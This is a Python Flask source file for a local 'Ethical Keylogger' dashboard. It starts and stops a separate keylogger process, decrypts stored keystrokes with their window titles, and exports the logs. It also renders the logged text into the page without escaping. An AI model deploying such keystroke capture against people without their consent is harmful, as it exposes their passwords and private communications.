#!/usr/bin/env python3
"""
Flask Web Dashboard for the Ethical Keylogger
Provides a web interface to control keylogging and view logs

Made By Vision
GitHub: github.com/vision-dev1
Website: https://visionkc.com.np
"""

import os
import sys
import json
import sqlite3
import threading
import subprocess
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
from cryptography.fernet import Fernet

app = Flask(__name__, template_folder='templates', static_folder='static')

# Global variables for keylogger control
keylogger_process = None
keylogger_running = False

class DatabaseManager:
    def __init__(self, db_path="keylogs.db", key_path="secret.key"):
        self.db_path = db_path
        self.key_path = key_path
        
        # Load encryption key
        if os.path.exists(self.key_path):
            with open(self.key_path, 'rb') as key_file:
                key = key_file.read()
            self.cipher_suite = Fernet(key)
        else:
            self.cipher_suite = None

    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet"""
        if not self.cipher_suite:
            return "[KEY_NOT_FOUND]"
        try:
            decrypted = self.cipher_suite.decrypt(encrypted_data.encode()).decode()
            return decrypted
        except Exception as e:
            return f"[DECRYPTION_ERROR: {str(e)}]"

    def get_keystrokes(self, filter_date=None, filter_window=None):
        """Get keystrokes with optional filtering"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Build query with filters
        query = "SELECT timestamp, window_title, key_data FROM keystrokes WHERE is_encrypted = 1"
        params = []
        
        if filter_date:
            query += " AND timestamp LIKE ?"
            params.append(f"{filter_date}%")
            
        if filter_window:
            query += " AND window_title LIKE ?"
            params.append(f"%{filter_window}%")
            
        query += " ORDER BY timestamp DESC LIMIT 1000"  # Limit to last 1000 records
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        
        results = []
        for row in rows:
            timestamp, window_title, encrypted_key_data = row
            decrypted_key_data = self.decrypt_data(encrypted_key_data)
            
            results.append({
                'timestamp': timestamp,
                'window_title': window_title,
                'keystroke': decrypted_key_data
            })
            
        conn.close()
        return results

    def get_system_events(self):
        """Get system events"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT timestamp, event_type, event_data FROM system_events ORDER BY timestamp DESC LIMIT 100")
        rows = cursor.fetchall()
        
        results = []
        for row in rows:
            timestamp, event_type, event_data = row
            results.append({
                'timestamp': timestamp,
                'event_type': event_type,
                'event_data': event_data
            })
            
        conn.close()
        return results

    def get_alerts(self):
        """Get security alerts"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT timestamp, alert_type, alert_data FROM alerts ORDER BY timestamp DESC LIMIT 100")
        rows = cursor.fetchall()
        
        results = []
        for row in rows:
            timestamp, alert_type, alert_data = row
            results.append({
                'timestamp': timestamp,
                'alert_type': alert_type,
                'alert_data': alert_data
            })
            
        conn.close()
        return results

    def get_statistics(self):
        """Get logging statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Get total counts
        cursor.execute("SELECT COUNT(*) FROM keystrokes")
        total_keystrokes = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM system_events")
        total_events = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM alerts")
        total_alerts = cursor.fetchone()[0]
        
        # Get recent activity
        cursor.execute("SELECT timestamp FROM keystrokes ORDER BY timestamp DESC LIMIT 1")
        last_keystroke = cursor.fetchone()
        last_keystroke_time = last_keystroke[0] if last_keystroke else "Never"
        
        conn.close()
        
        return {
            'total_keystrokes': total_keystrokes,
            'total_events': total_events,
            'total_alerts': total_alerts,
            'last_keystroke': last_keystroke_time
        }

# Initialize database manager
db_manager = DatabaseManager()

@app.route('/')
def index():
    """Main dashboard page"""
    stats = db_manager.get_statistics()
    return render_template('index.html', stats=stats)

@app.route('/api/status')
def api_status():
    """API endpoint to get keylogger status"""
    global keylogger_running
    return jsonify({
        'running': keylogger_running,
        'pid': keylogger_process.pid if keylogger_process and keylogger_process.poll() is None else None
    })

@app.route('/api/start', methods=['POST'])
def api_start():
    """API endpoint to start keylogger"""
    global keylogger_process, keylogger_running
    
    if keylogger_running:
        return jsonify({'success': False, 'message': 'Keylogger is already running'})
    
    try:
        # Start keylogger process
        keylogger_process = subprocess.Popen([sys.executable, 'keylogger.py'])
        keylogger_running = True
        return jsonify({'success': True, 'message': 'Keylogger started successfully'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Failed to start keylogger: {str(e)}'})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    """API endpoint to stop keylogger"""
    global keylogger_process, keylogger_running
    
    if not keylogger_running:
        return jsonify({'success': False, 'message': 'Keylogger is not running'})
    
    try:
        # Terminate keylogger process
        if keylogger_process and keylogger_process.poll() is None:
            keylogger_process.terminate()
            keylogger_process.wait(timeout=5)
        keylogger_running = False
        return jsonify({'success': True, 'message': 'Keylogger stopped successfully'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Failed to stop keylogger: {str(e)}'})

@app.route('/api/keystrokes')
def api_keystrokes():
    """API endpoint to get keystrokes"""
    filter_date = request.args.get('date')
    filter_window = request.args.get('window')
    
    keystrokes = db_manager.get_keystrokes(filter_date, filter_window)
    return jsonify(keystrokes)

@app.route('/api/events')
def api_events():
    """API endpoint to get system events"""
    events = db_manager.get_system_events()
    return jsonify(events)

@app.route('/api/alerts')
def api_alerts():
    """API endpoint to get security alerts"""
    alerts = db_manager.get_alerts()
    return jsonify(alerts)

@app.route('/api/stats')
def api_stats():
    """API endpoint to get statistics"""
    stats = db_manager.get_statistics()
    return jsonify(stats)

@app.route('/api/export')
def api_export():
    """API endpoint to export data"""
    export_type = request.args.get('type', 'txt')
    filter_date = request.args.get('date')
    filter_window = request.args.get('window')
    
    try:
        if export_type == 'csv':
            # Generate CSV export
            import csv
            from io import StringIO
            
            keystrokes = db_manager.get_keystrokes(filter_date, filter_window)
            
            output = StringIO()
            writer = csv.writer(output)
            writer.writerow(['Timestamp', 'Window Title', 'Keystroke'])
            
            for keystroke in keystrokes:
                writer.writerow([
                    keystroke['timestamp'],
                    keystroke['window_title'],
                    keystroke['keystroke']
                ])
                
            csv_content = output.getvalue()
            output.close()
            
            filename = f"keylog_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            with open(filename, 'w') as f:
                f.write(csv_content)
                
            return send_file(filename, as_attachment=True)
            
        else:
            # Generate TXT export
            keystrokes = db_manager.get_keystrokes(filter_date, filter_window)
            
            txt_content = "KEYLOGGER EXPORT\n"
            txt_content += "=" * 50 + "\n"
            txt_content += f"Exported on: {datetime.now().isoformat()}\n"
            txt_content += "=" * 50 + "\n\n"
            
            for keystroke in keystrokes:
                txt_content += f"[{keystroke['timestamp']}] [{keystroke['window_title']}] {keystroke['keystroke']}\n"
                
            filename = f"keylog_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(txt_content)
                
            return send_file(filename, as_attachment=True)
            
    except Exception as e:
        return jsonify({'success': False, 'message': f'Export failed: {str(e)}'})

def create_templates():
    """Create HTML templates directory and files"""
    # Create templates directory
    if not os.path.exists('templates'):
        os.makedirs('templates')
        
    # Create static directory
    if not os.path.exists('static'):
        os.makedirs('static')
        
    # Create CSS file
    css_content = """
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #f5f5f5;
    margin: 0;
    padding: 0;
}

.container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 20px;
}

header {
    background-color: #2c3e50;
    color: white;
    padding: 20px;
    border-radius: 5px;
    margin-bottom: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

h1 {
    margin: 0;
}

.controls {
    background-color: white;
    padding: 20px;
    border-radius: 5px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    margin-bottom: 20px;
}

.btn {
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-weight: bold;
    transition: background-color 0.3s;
}

.btn-primary {
    background-color: #3498db;
    color: white;
}

.btn-danger {
    background-color: #e74c3c;
    color: white;
}

.btn-success {
    background-color: #2ecc71;
    color: white;
}

.btn:hover {
    opacity: 0.9;
}

.stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 20px;
    margin-bottom: 20px;
}

.stat-card {
    background-color: white;
    padding: 20px;
    border-radius: 5px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    text-align: center;
}

.stat-value {
    font-size: 2em;
    font-weight: bold;
    color: #2c3e50;
}

.stat-label {
    color: #7f8c8d;
    margin-top: 5px;
}

.tabs {
    background-color: white;
    border-radius: 5px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    overflow: hidden;
}

.tab-buttons {
    display: flex;
    border-bottom: 1px solid #eee;
}

.tab-button {
    padding: 15px 20px;
    background-color: #f8f9fa;
    border: none;
    cursor: pointer;
    flex: 1;
    text-align: center;
    font-weight: bold;
    transition: background-color 0.3s;
}

.tab-button.active {
    background-color: #3498db;
    color: white;
}

.tab-button:hover:not(.active) {
    background-color: #e9ecef;
}

.tab-content {
    padding: 20px;
    display: none;
}

.tab-content.active {
    display: block;
}

.filter-bar {
    display: flex;
    gap: 10px;
    margin-bottom: 20px;
    flex-wrap: wrap;
}

.filter-bar input, .filter-bar select {
    padding: 8px 12px;
    border: 1px solid #ddd;
    border-radius: 5px;
    flex: 1;
    min-width: 150px;
}

.filter-bar button {
    padding: 8px 15px;
    background-color: #3498db;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

table {
    width: 100%;
    border-collapse: collapse;
}

th, td {
    padding: 12px;
    text-align: left;
    border-bottom: 1px solid #ddd;
}

th {
    background-color: #f8f9fa;
    font-weight: bold;
}

tr:hover {
    background-color: #f5f5f5;
}

.status-indicator {
    display: inline-block;
    width: 12px;
    height: 12px;
    border-radius: 50%;
    margin-right: 8px;
}

.status-running {
    background-color: #2ecc71;
}

.status-stopped {
    background-color: #e74c3c;
}

.footer {
    text-align: center;
    margin-top: 30px;
    padding: 20px;
    color: #7f8c8d;
    font-size: 0.9em;
}

.footer a {
    color: #3498db;
    text-decoration: none;
}

.footer a:hover {
    text-decoration: underline;
}
"""
    
    with open('static/style.css', 'w') as f:
        f.write(css_content)
        
    # Create JavaScript file
    js_content = """
let currentTab = 'keystrokes';

// DOM Elements
const statusElement = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');

// Check keylogger status periodically
setInterval(updateStatus, 2000);

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    updateStatus();
    loadTabContent(currentTab);
    
    // Tab switching
    document.querySelectorAll('.tab-button').forEach(button => {
        button.addEventListener('click', () => {
            const tab = button.getAttribute('data-tab');
            switchTab(tab);
        });
    });
    
    // Form submissions
    document.getElementById('keystrokeFilterForm').addEventListener('submit', function(e) {
        e.preventDefault();
        loadKeystrokes();
    });
    
    document.getElementById('exportForm').addEventListener('submit', function(e) {
        e.preventDefault();
        exportData();
    });
});

function switchTab(tab) {
    // Update tab buttons
    document.querySelectorAll('.tab-button').forEach(button => {
        button.classList.remove('active');
    });
    document.querySelector(`.tab-button[data-tab="${tab}"]`).classList.add('active');
    
    // Update tab content
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(`${tab}Tab`).classList.add('active');
    
    currentTab = tab;
    loadTabContent(tab);
}

function loadTabContent(tab) {
    switch(tab) {
        case 'keystrokes':
            loadKeystrokes();
            break;
        case 'events':
            loadEvents();
            break;
        case 'alerts':
            loadAlerts();
            break;
        case 'stats':
            loadStats();
            break;
    }
}

function updateStatus() {
    fetch('/api/status')
        .then(response => response.json())
        .then(data => {
            const statusIndicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');
            
            if (data.running) {
                statusIndicator.className = 'status-indicator status-running';
                statusText.textContent = 'Running';
                startBtn.disabled = true;
                stopBtn.disabled = false;
            } else {
                statusIndicator.className = 'status-indicator status-stopped';
                statusText.textContent = 'Stopped';
                startBtn.disabled = false;
                stopBtn.disabled = true;
            }
        })
        .catch(error => {
            console.error('Error updating status:', error);
        });
}

function startKeylogger() {
    fetch('/api/start', {
        method: 'POST'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showMessage('Keylogger started successfully', 'success');
            updateStatus();
        } else {
            showMessage(data.message, 'error');
        }
    })
    .catch(error => {
        showMessage('Error starting keylogger: ' + error, 'error');
    });
}

function stopKeylogger() {
    fetch('/api/stop', {
        method: 'POST'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showMessage('Keylogger stopped successfully', 'success');
            updateStatus();
        } else {
            showMessage(data.message, 'error');
        }
    })
    .catch(error => {
        showMessage('Error stopping keylogger: ' + error, 'error');
    });
}

function loadKeystrokes() {
    const dateFilter = document.getElementById('dateFilter').value;
    const windowFilter = document.getElementById('windowFilter').value;
    
    let url = '/api/keystrokes';
    const params = [];
    
    if (dateFilter) params.push(`date=${encodeURIComponent(dateFilter)}`);
    if (windowFilter) params.push(`window=${encodeURIComponent(windowFilter)}`);
    
    if (params.length > 0) {
        url += '?' + params.join('&');
    }
    
    fetch(url)
        .then(response => response.json())
        .then(data => {
            const tbody = document.querySelector('#keystrokesTable tbody');
            tbody.innerHTML = '';
            
            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3">No keystrokes found</td></tr>';
                return;
            }
            
            data.forEach(item => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${item.timestamp}</td>
                    <td>${item.window_title || 'Unknown'}</td>
                    <td>${item.keystroke}</td>
                `;
                tbody.appendChild(row);
            });
        })
        .catch(error => {
            console.error('Error loading keystrokes:', error);
        });
}

function loadEvents() {
    fetch('/api/events')
        .then(response => response.json())
        .then(data => {
            const tbody = document.querySelector('#eventsTable tbody');
            tbody.innerHTML = '';
            
            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3">No events found</td></tr>';
                return;
            }
            
            data.forEach(item => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${item.timestamp}</td>
                    <td>${item.event_type}</td>
                    <td>${item.event_data}</td>
                `;
                tbody.appendChild(row);
            });
        })
        .catch(error => {
            console.error('Error loading events:', error);
        });
}

function loadAlerts() {
    fetch('/api/alerts')
        .then(response => response.json())
        .then(data => {
            const tbody = document.querySelector('#alertsTable tbody');
            tbody.innerHTML = '';
            
            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3">No alerts found</td></tr>';
                return;
            }
            
            data.forEach(item => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${item.timestamp}</td>
                    <td>${item.alert_type}</td>
                    <td>${item.alert_data}</td>
                `;
                tbody.appendChild(row);
            });
        })
        .catch(error => {
            console.error('Error loading alerts:', error);
        });
}

function loadStats() {
    fetch('/api/stats')
        .then(response => response.json())
        .then(data => {
            document.getElementById('totalKeystrokes').textContent = data.total_keystrokes;
            document.getElementById('totalEvents').textContent = data.total_events;
            document.getElementById('totalAlerts').textContent = data.total_alerts;
            document.getElementById('lastKeystroke').textContent = data.last_keystroke;
        })
        .catch(error => {
            console.error('Error loading stats:', error);
        });
}

function exportData() {
    const exportType = document.getElementById('exportType').value;
    const dateFilter = document.getElementById('exportDateFilter').value;
    const windowFilter = document.getElementById('exportWindowFilter').value;
    
    let url = `/api/export?type=${exportType}`;
    
    if (dateFilter) url += `&date=${encodeURIComponent(dateFilter)}`;
    if (windowFilter) url += `&window=${encodeURIComponent(windowFilter)}`;
    
    window.location.href = url;
}

function showMessage(message, type) {
    // Create alert element
    const alert = document.createElement('div');
    alert.className = `alert alert-${type}`;
    alert.textContent = message;
    
    // Add to page
    const container = document.querySelector('.container');
    container.insertBefore(alert, container.firstChild);
    
    // Remove after 3 seconds
    setTimeout(() => {
        alert.remove();
    }, 3000);
}
"""
    
    with open('static/script.js', 'w') as f:
        f.write(js_content)
        
    # Create HTML template
    html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethical Keylogger Dashboard</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="container">
        <header>
            <div>
                <h1>Ethical Keylogger Dashboard</h1>
                <p>Advanced Activity Monitoring Tool</p>
            </div>
            <div>
                <span id="status">
                    <span id="statusIndicator" class="status-indicator status-stopped"></span>
                    <span id="statusText">Stopped</span>
                </span>
            </div>
        </header>
        
        <div class="controls">
            <button id="startBtn" class="btn btn-primary" onclick="startKeylogger()">Start Keylogger</button>
            <button id="stopBtn" class="btn btn-danger" onclick="stopKeylogger()" disabled>Stop Keylogger</button>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalKeystrokes">{{ stats.total_keystrokes }}</div>
                <div class="stat-label">Total Keystrokes</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalEvents">{{ stats.total_events }}</div>
                <div class="stat-label">System Events</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalAlerts">{{ stats.total_alerts }}</div>
                <div class="stat-label">Security Alerts</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="lastKeystroke">{{ stats.last_keystroke.split('T')[0] if stats.last_keystroke != 'Never' else 'Never' }}</div>
                <div class="stat-label">Last Activity</div>
            </div>
        </div>
        
        <div class="tabs">
            <div class="tab-buttons">
                <button class="tab-button active" data-tab="keystrokes">Keystrokes</button>
                <button class="tab-button" data-tab="events">System Events</button>
                <button class="tab-button" data-tab="alerts">Security Alerts</button>
                <button class="tab-button" data-tab="export">Export Data</button>
            </div>
            
            <div class="tab-content active" id="keystrokesTab">
                <div class="filter-bar">
                    <input type="date" id="dateFilter" placeholder="Filter by date">
                    <input type="text" id="windowFilter" placeholder="Filter by window title">
                    <button onclick="loadKeystrokes()">Apply Filters</button>
                </div>
                <table id="keystrokesTable">
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Window Title</th>
                            <th>Keystroke</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td colspan="3">Loading...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="tab-content" id="eventsTab">
                <table id="eventsTable">
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Event Type</th>
                            <th>Event Data</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td colspan="3">Loading...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="tab-content" id="alertsTab">
                <table id="alertsTable">
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Alert Type</th>
                            <th>Alert Data</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td colspan="3">Loading...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="tab-content" id="exportTab">
                <form id="exportForm">
                    <div class="filter-bar">
                        <select id="exportType">
                            <option value="txt">TXT Format</option>
                            <option value="csv">CSV Format</option>
                        </select>
                        <input type="date" id="exportDateFilter" placeholder="Filter by date">
                        <input type="text" id="exportWindowFilter" placeholder="Filter by window title">
                        <button type="submit">Export Data</button>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="footer">
            <p>Ethical Keylogger for Linux Systems | Made By Vision</p>
            <p>GitHub: <a href="https://github.com/vision-dev1" target="_blank">github.com/vision-dev1</a> | 
            Website: <a href="https://visionkc.com.np" target="_blank">visionkc.com.np</a></p>
            <p>Designed by Vision</p>
        </div>
    </div>
    
    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
"""
    
    with open('templates/index.html', 'w') as f:
        f.write(html_content)

def main():
    """Main function"""
    # Create templates and static files
    create_templates()
    
    # Run Flask app
    app.run(host='127.0.0.1', port=5000, debug=False)

if __name__ == "__main__":
    main()